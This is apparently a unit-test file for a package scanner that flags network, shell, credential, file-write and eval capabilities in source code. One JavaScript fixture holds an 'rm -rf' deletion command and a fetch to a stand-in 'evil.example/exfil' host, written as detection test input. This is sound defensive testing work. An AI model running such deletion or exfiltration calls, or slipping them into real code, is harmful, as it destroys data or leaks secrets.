"""Tests for plugattest.scanner — capability detection over a package's own source."""

import os
import tempfile
import unittest

from plugattest.scanner import scan_package


def _write(root, relpath, text):
    path = os.path.join(root, relpath)
    parent = os.path.dirname(path)
    if parent:
        os.makedirs(parent, exist_ok=True)
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(text)


def _caps(hits):
    return {hit.capability for hit in hits}


class TestPythonSource(unittest.TestCase):
    def test_network_and_shell(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "run.py", (
                "import subprocess, urllib.request\n"
                "def go():\n"
                "    subprocess.run(['ls'])\n"
                "    urllib.request.urlopen('https://example.com')\n"
            ))
            hits = scan_package(root)
        caps = _caps(hits)
        self.assertIn("network", caps)
        self.assertIn("shell", caps)
        self.assertTrue(all(hit.line > 0 for hit in hits))

    def test_credential_read(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "cfg.py", "import os\nKEY = os.environ['API_KEY']\n")
            hits = scan_package(root)
        self.assertIn("credentials", _caps(hits))

    def test_fs_write_only_for_write_modes(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "read.py", "with open('a.txt') as fh:\n    fh.read()\n")
            _write(root, "write.py", "with open('a.txt', 'w') as fh:\n    fh.write('x')\n")
            hits = scan_package(root)
        write_hits = [h for h in hits if h.capability == "fs_write"]
        self.assertEqual(len(write_hits), 1)
        self.assertIn("write.py", write_hits[0].path)

    def test_eval_detected(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "bad.py", "eval(user_input)\n")
            hits = scan_package(root)
        self.assertIn("code_eval", _caps(hits))


class TestJavaScriptSource(unittest.TestCase):
    def test_node_signals(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "index.js", (
                "const { execSync } = require('child_process');\n"
                "const fs = require('fs');\n"
                "execSync('rm -rf /tmp/x');\n"
                "fs.writeFileSync('/tmp/out', 'x');\n"
                "fetch('https://evil.example/exfil');\n"
            ))
            hits = scan_package(root)
        caps = _caps(hits)
        self.assertIn("shell", caps)
        self.assertIn("fs_write", caps)
        self.assertIn("network", caps)


class TestShellScriptSignals(unittest.TestCase):
    def test_curl_without_flags_is_network(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "fetch.sh", "curl https://example.com/data.json\n")
            self.assertIn("network", _caps(scan_package(root)))

    def test_package_manager_install_is_network(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "setup.sh", "npm install puppeteer\npip install requests\n")
            caps = _caps(scan_package(root))
        self.assertIn("network", caps)
        self.assertIn("shell", caps)

    def test_local_http_server_is_network(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "serve.sh", "python3 -m http.server 8000\n")
            self.assertIn("network", _caps(scan_package(root)))


class TestScope(unittest.TestCase):
    def test_skips_vendored_and_binary_dirs(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "node_modules/dep/index.js", "fetch('https://x')\n")
            _write(root, ".git/hooks/pre-commit", "curl https://x\n")
            _write(root, "src/main.py", "print('clean')\n")
            hits = scan_package(root)
        self.assertEqual(hits, [])

    def test_ignores_non_code_suffixes(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "README.md", "run `subprocess.run` and `fetch()` here\n")
            hits = scan_package(root)
        self.assertEqual(hits, [])

    def test_hits_are_deduplicated_per_file_and_capability(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, "many.py", "\n".join(["eval(x)"] * 5) + "\n")
            hits = scan_package(root)
        self.assertEqual(len([h for h in hits if h.capability == "code_eval"]), 1)

    def test_missing_root_raises_oserror(self):
        with self.assertRaises(OSError):
            scan_package("/nonexistent/plugattest/path")


if __name__ == "__main__":
    unittest.main()
